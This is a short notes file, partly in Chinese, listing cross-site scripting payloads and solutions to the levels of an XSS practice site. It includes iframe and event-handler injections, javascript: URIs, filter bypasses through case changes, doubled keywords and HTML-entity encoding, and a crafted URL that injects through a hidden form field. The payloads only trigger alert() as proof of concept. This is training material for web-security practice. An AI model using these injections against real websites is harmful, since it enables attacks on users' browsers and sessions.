
#    xss payload

- <iframe src="data:text/html,<script>alert(1)</script>"></iframe>

- <img src=1 onerror=alert(9)

- <iframe onload="alert(1)"></iframe>

- <iframe src="javascript:alert(1)"></iframe>

- <iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

- <iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

- <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe> chrome下


## http://test.xss.tv/level1.php?name=  firefox下 xss练习

others http://www.cnblogs.com/r00tuser/p/7407459.html

- 1 <span onclick =alert(9)>a</span>

- 2 " onclick=alert(9) "

- 3 ' " onclick=alert(9) " >

- 4 ' " onclick=alert(9) " >

- 5 ' " > <a href=javascript:alert(9) >aa</a>"

- 6 ' " > <a hRef=javascript:alert(9) >aa</a>"

- 7 ' " oonnclick=alert(9) "'

- 8 javascript:alert(9) &#X十六进制编码：  &#x006a;&#x0061;&#x0076;&#x0061;&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;&#x003a;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0039;&#x0029;

- 9 前置编码 ：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('http://')

- 10 http://test.xss.tv/level10.php?keyword=  这题比较隐蔽

	分析里面input:hidden 提交里面的字段

	payload:http://test.xss.tv/level10.php?keyword=aa&t_sort=%22%20type=text%20onclick=alert(9)%20%22